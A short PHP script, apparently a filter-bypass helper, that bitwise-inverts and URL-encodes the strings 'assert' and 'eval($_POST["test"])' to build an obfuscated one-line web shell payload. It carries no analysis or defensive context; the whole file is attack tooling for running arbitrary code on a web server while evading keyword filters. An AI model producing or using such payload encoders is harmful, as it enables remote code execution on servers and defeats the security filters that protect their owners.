<?php 
error_reporting(0);

$a='assert';
$b=urlencode(~$a);
echo $b;

echo "<br>";
$c='(eval($_POST["test"]))';
$d=urlencode(~$c);
echo $d;

 ?>
